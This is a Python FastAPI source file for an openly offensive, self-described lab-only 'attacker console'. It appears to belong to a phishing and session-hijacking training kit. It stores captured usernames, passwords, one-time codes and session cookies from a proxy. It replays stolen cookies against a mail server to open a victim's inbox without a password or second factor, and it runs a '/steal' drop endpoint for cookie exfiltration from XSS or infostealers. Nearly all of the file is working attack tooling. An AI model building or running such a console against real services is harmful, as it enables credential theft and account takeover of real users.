"""
KINGNET attacker console — what the attacker sees.

Receives captures from the proxy (credentials, 2FA codes, stolen session cookies),
shows them live, and lets you REPLAY a stolen session cookie against the real lab
target to open the victim's mailbox — proving that the stolen token alone = account
takeover, with no password and no 2FA. Lab-only.
"""
import os
import sqlite3
import time
from contextlib import closing

import httpx
from fastapi import FastAPI, Request
from fastapi.responses import HTMLResponse, JSONResponse
from fastapi.templating import Jinja2Templates

DB = os.environ.get("CONSOLE_DB", os.path.join(os.path.dirname(__file__), "data", "captures.db"))
KINGMAIL_URL = os.environ.get("KINGMAIL_URL", "http://localhost:8081").rstrip("/")
os.makedirs(os.path.dirname(DB), exist_ok=True)

app = FastAPI(title="KINGNET attacker console (lab-only)")
tpl = Jinja2Templates(directory=os.path.join(os.path.dirname(__file__), "templates"))


def db():
    c = sqlite3.connect(DB)
    c.row_factory = sqlite3.Row
    return c


with closing(db()) as c:
    c.execute("""CREATE TABLE IF NOT EXISTS captures(
        id INTEGER PRIMARY KEY AUTOINCREMENT, ts REAL, track TEXT, kind TEXT, data TEXT)""")
    c.commit()


@app.post("/api/capture")
async def capture(payload: dict):
    import json
    with closing(db()) as c:
        c.execute("INSERT INTO captures(ts,track,kind,data) VALUES(?,?,?,?)",
                  (payload.get("ts", time.time()), payload.get("track", "?"),
                   payload.get("kind", "?"), json.dumps(payload.get("data", {}))))
        c.commit()
    return {"ok": True}


def _sessions():
    import json
    with closing(db()) as c:
        rows = c.execute("SELECT * FROM captures ORDER BY ts ASC").fetchall()
    sess = {}
    for r in rows:
        s = sess.setdefault(r["track"], {"track": r["track"], "creds": None, "otp": None,
                                         "cookie": None, "webauthn": None, "events": [],
                                         "first": r["ts"]})
        data = json.loads(r["data"])
        s["events"].append({"ts": r["ts"], "kind": r["kind"], "data": data})
        if r["kind"] == "credentials":
            s["creds"] = data
        elif r["kind"] == "otp":
            s["otp"] = data
        elif r["kind"] == "session_cookie":
            s["cookie"] = data
        elif r["kind"] == "webauthn_assertion":
            s["webauthn"] = data
    return list(sess.values())


@app.get("/", response_class=HTMLResponse)
def dashboard(request: Request):
    return tpl.TemplateResponse(request, "dashboard.html", {"sessions": _sessions()})


@app.get("/hijack/{track}", response_class=HTMLResponse)
def hijack(request: Request, track: str):
    """Replay the stolen session cookie -> open the victim's inbox. No pw, no 2FA."""
    sess = {s["track"]: s for s in _sessions()}.get(track)
    if not sess or not sess.get("cookie"):
        return HTMLResponse("<p>No stolen session cookie for this victim yet.</p>", status_code=404)
    ck = sess["cookie"]
    try:
        r = httpx.get(f"{KINGMAIL_URL}/inbox",
                      cookies={ck["cookie_name"]: ck["cookie_value"]},
                      headers={"User-Agent": "KINGNET-replay/1.0 (attacker tooling)",
                               "X-Lab-Geo": "Amsterdam, NL (bulletproof VPS)"},
                      follow_redirects=False, timeout=15)
        ok = r.status_code == 200 and "Signed in as" in r.text
        inbox_html = r.text if ok else ""
    except Exception as e:
        ok, inbox_html = False, f"<pre>error: {e}</pre>"
    return tpl.TemplateResponse(request, "hijack.html", {"track": track, "ok": ok,
                                 "cookie": ck, "inbox": inbox_html, "kingmail": KINGMAIL_URL})


STOLEN: list = []  # cookie-theft drop server (XSS / infostealer exfiltration lands here)


@app.get("/steal")
async def steal_get(request: Request):
    STOLEN.insert(0, {"ts": time.time(), "src": request.query_params.get("src", "?"),
                      "data": request.query_params.get("c", ""),
                      "ua": request.headers.get("user-agent", "")})
    return JSONResponse({"ok": True})  # a real drop server would 200 an image/pixel


@app.post("/steal")
async def steal_post(payload: dict):
    STOLEN.insert(0, {"ts": time.time(), "src": payload.get("src", "?"),
                      "data": payload.get("data", payload), "ua": payload.get("ua", "")})
    return {"ok": True}


@app.get("/stolen")
def stolen():
    return {"count": len(STOLEN), "items": STOLEN}


@app.get("/api/captures")
def api_captures():
    """Full captured data per victim, for the terminal operator console."""
    out = []
    for s in _sessions():
        creds = s.get("creds") or {}
        out.append({
            "track": s["track"], "first": s.get("first"),
            "username": creds.get("username"), "password": creds.get("password"),
            "otp": (s.get("otp") or {}).get("code"),
            "cookie": s.get("cookie"),            # {cookie_name, cookie_value, note}
            "webauthn": s.get("webauthn"),        # {bound_origin, verdict, rp_status}
            "events": len(s.get("events", [])),
        })
    return JSONResponse({"captures": out})


@app.get("/api/summary")
def api_summary():
    """Machine-readable capture summary for the kingnet CLI (mission auto-detection)."""
    sess = _sessions()
    return JSONResponse({
        "victims": len(sess),
        "credentials": sum(1 for s in sess if s.get("creds")),
        "otps": sum(1 for s in sess if s.get("otp")),
        "cookies": sum(1 for s in sess if s.get("cookie")),
        "webauthn_rejected": sum(1 for s in sess if s.get("webauthn")),
        "exfils": len(STOLEN),
        "tracks": [{"track": s["track"], "has_cookie": bool(s.get("cookie")),
                    "user": (s.get("creds") or {}).get("username", "")} for s in sess],
    })


@app.get("/healthz")
def healthz():
    return {"ok": True}
